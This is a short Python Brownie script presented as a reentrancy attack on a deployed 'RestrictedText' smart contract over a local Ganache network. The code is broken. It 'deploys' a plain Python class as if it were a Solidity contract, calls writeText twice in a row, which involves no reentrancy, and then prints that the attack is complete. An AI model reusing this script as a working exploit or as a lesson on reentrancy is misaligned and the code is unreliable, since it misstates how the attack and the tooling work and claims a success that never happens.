# reentrancy_attack.py
from brownie import accounts, network, project

# Load Brownie project
p = project.load('brownie-dir')
p.load_config()

from brownie.project.BrownieDirProject import *

# Import contract after loading the project
RestrictedText = p.RestrictedText

# Connect to local Ganache (assuming it runs on default port 8545)
network.connect("development")

# Function to perform reentrancy attack
def reentrancy_attack():
    accounts_list = accounts

    # Admin account (change index as needed)
    admin = accounts_list[3]

    # Address of the deployed contract (update this with the actual deployed contract address)
    contract_address = "0xCa8309269B6ae9549340F5899E20fC1502Be5e47"

    # Deploy a malicious contract that will perform the reentrancy attack
    malicious_contract = accounts_list[4].deploy(MaliciousContract)

    # Call the malicious contract's attack function which triggers the reentrancy
    tx = malicious_contract.attack(contract_address, {'from': admin})
    tx.wait(1)  # Wait for transaction to be mined

    print("Reentrancy attack complete.")

# Example malicious contract that performs the reentrancy attack
class MaliciousContract:
    def attack(self, contract_address):
        contract = RestrictedText.at(contract_address)
        
        # Perform a writeText operation (example of function that can trigger reentrancy)
        try:
            contract.writeText("Malicious text", {'from': accounts[4]})
        except:
            print("Revert attack")
            
        # The contract can now reenter the contract and manipulate the state
        try:
            contract.writeText("Attack successful", {'from': accounts[4]})
        except:
            print("Revert attack")

# Main entry point
if __name__ == "__main__":
    reentrancy_attack()
